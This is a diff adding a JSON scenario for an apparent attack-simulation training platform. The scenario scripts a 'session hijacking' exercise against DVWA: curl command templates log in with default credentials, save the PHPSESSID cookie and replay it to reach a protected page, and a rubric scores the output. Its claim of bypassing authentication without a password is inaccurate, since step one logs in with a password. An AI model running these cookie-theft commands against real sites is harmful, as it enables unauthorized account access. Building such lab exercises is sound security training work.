@@ -1,0 +1,91 @@
+{
+  "id": "session_hijacking_basic",
+  "name": "Web Session Hijacking Attack Simulation",
+  "description": "教学与测试目的：对 Web 应用进行会话劫持（Session Hijacking）测试。通过登录接口提取受害者的有效 Session ID（PHPSESSID），在不提供账户明文密码的情况下，使用该 Session 凭据向系统发起请求，验证是否能成功绕过身份验证访问后台受限资源。演示 MITRE ATT&CK 凭据访问（Credential Access）战术阶段的会话劫持技术（T1539）。",
+  "category": "exploitation",
+  "difficulty": "medium",
+  "estimatedDuration": "5 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Credential Access",
+    "Initial Access"
+  ],
+  "mitreTechniques": [
+    "T1539"
+  ],
+  "targetType": [
+    "dvwa",
+    "web_url"
+  ],
+  "steps": [
+    {
+      "id": "step1_retrieve_session",
+      "name": "Retrieve Stolen Session Cookie",
+      "description": "使用 curl 请求登录接口，并在本地提取模拟的受害者有效 Session ID（PHPSESSID）。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "TOKEN=$(curl -s <target>/login.php | grep -oP \"user_token' value='\\K[^']+\") && curl -s -c /tmp/stolen_jar.txt -d \"username=admin&password=password&Login=Login&user_token=$TOKEN\" <target>/login.php -o /dev/null && PHPSESSID=$(awk '/PHPSESSID/{print $NF}' /tmp/stolen_jar.txt) && echo \"Stolen Session Cookie: PHPSESSID=$PHPSESSID\""
+      ],
+      "score": 40,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1539"
+      ]
+    },
+    {
+      "id": "step2_access_with_session",
+      "name": "Access Admin Panel with Stolen Session",
+      "description": "通过带有劫持 Cookie 的请求直接访问 DVWA 主页/后台页面，验证是否成功绕过认证进入受限区域。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "PHPSESSID=$(awk '/PHPSESSID/{print $NF}' /tmp/stolen_jar.txt) && curl -s -b \"PHPSESSID=$PHPSESSID\" <target>/index.php | grep -i \"Welcome\" && echo \"Session Hijacking Successful: Bypassed Authentication\""
+      ],
+      "score": 60,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1539"
+      ]
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "session_hijacked",
+        "desc": "成功提取并获取到会话 Cookie 凭据",
+        "points": 40,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Stolen Session Cookie"
+        }
+      },
+      {
+        "id": "auth_bypassed",
+        "desc": "注入劫持会话后，直接访问登录后主页成功",
+        "points": 60,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Bypassed Authentication|Welcome"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "baselineGroup": "web-vuln-scan",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "会话劫持验证注入 Cookie 绕过登录；需要目标 DVWA 容器及登录凭据有效，以便进行会话生成与劫持演示",
+  "applicableTargetType": [
+    "dvwa",
+    "web_url"
+  ],
+  "teachingObjective": "演示使用窃取的 PHPSESSID Cookie 进行会话劫持与身份认证绕过测试（T1539）",
+  "target_class": "dvwa",
+  "disableAutoInsert": true
+}
